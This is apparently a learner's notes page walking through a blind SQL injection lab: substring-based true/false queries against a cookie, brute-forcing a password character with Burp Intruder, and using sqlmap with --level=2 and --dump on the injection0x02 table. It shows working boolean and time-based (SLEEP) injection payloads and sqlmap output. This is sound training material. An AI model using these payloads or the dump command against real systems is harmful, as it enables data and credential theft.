<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>SQL Injection - Blind Part 2</title>
</head><body>We found our injection but this is a Blind Sql Injection cuz the query is only changing the behaviour the application.<br/>
i.e. showing welcome messsage to us<br/>
<br/>
It will not give us data from the databse.<br/>
<br/>
We have to create payloads that produce true false outputs and based on the behaviour we can slowly extract data.<br/>
<br/>
So will ask the database simply yes/or questions<br/>
eg: 1st character of the username is a yes or no.<br/>
eg: 1st character of Jeremy password is A ?<br/>
<br/>
Will use a function called Substring <br/>
substr()<br/>
<br/>
Syntax<br/>
SUBSTRING(string, start, length)<br/>
<br/>
<img height="329" src="image.png" width="800"/><br/>
<br/>
We do get a valid response<br/>
We acutally want to compare this to something that we grab from the databse. <br/>
command: substring((select version()), 1,1) = '7'#<br/>
And we got a failed response that is change in the content-length<br/>
<br/>
Let's check with 8 and i was even getting error with that cuz there was space b/w substring and (<br/>
<img height="291" src="image 2.png" width="750"/><br/>
And we get the valid response<br/>
<br/>
And with little more input and validation got to know that mysql version is 8.0.3<br/>
<br/>
Now will use to see the password of User Jessamy from injection0x02 database and autmate it with introder to get the 1st character of the password<br/>
<img height="304" src="image 3.png" width="650"/><br/>
<br/>
Will add 0-9 and a-z in the payload manually typing it from the keyboard.<br/>
<br/>
As you can see that we got the 1st character of the passoword which is z but in the real password Z is capital but sql is giving us true cuz it is not <b>case senstivie</b>.<br/>
<br/>
<b>Will use SQLmap now<br/>
</b>We got this error as we haven't inject the cookie<br/>
<img height="208" src="image 4.png" width="750"/><br/>
<br/>
will use <b>--level=2</b>in order to get the things running<br/>
<img height="282" src="image 5.png" width="700"/><br/>
<br/>
<img height="316" src="image 6.png" width="750"/><br/>
<br/>
Cookie parameter 'session' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n<br/>
sqlmap identified the following injection point(s) with a total of 284 HTTP(s) requests:<br/>
---<br/>
Parameter: session <b>(Cookie)</b><br/>
  Type: boolean-based blind<br/>
  Title: AND boolean-based blind - WHERE or HAVING clause<br/>
  <b>Payload: session=6967cabefd763ac1a1a88e11159957db' AND 9215=9215 AND 'wXiv'='wXiv; ajs_anonymous_id=5fcc0d10-51f3-4cea-b6bf-f71c74410776</b><br/>
<br/>
  Type: time-based blind<br/>
  Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br/>
  Payload: session=6967cabefd763ac1a1a88e11159957db' AND (SELECT 1741 FROM (SELECT(SLEEP(5)))wmTo) AND 'RjJH'='RjJH; ajs_anonymous_id=5fcc0d10-51f3-4cea-b6bf-f71c74410776<br/>
---<br/>
[20:37:48] [INFO] the back-end DBMS is MySQL<br/>
web server operating system: Linux Debian<br/>
<br/>
<br/>
Command:<br/>
$ sqlmap -r req2.txt --level=2 --dump -T injection0x02<br/>
<br/>
<br/>
<br/>
<img height="253" src="image 7.png" width="800"/><br/>
<br/>
<img height="217" src="image 8.png" width="750"/><br/>
<br/>
If we didn't use -T injection0x02<br/>
We even get this as output <br/>
<img height="255" src="image 9.png" width="700"/><br/>
<br/>
<br/>
<br/>
We get almost all the data with just a cookie using sqlmap.<br/>
<br/>
<br/>
<br/>
<br/>
</body></html>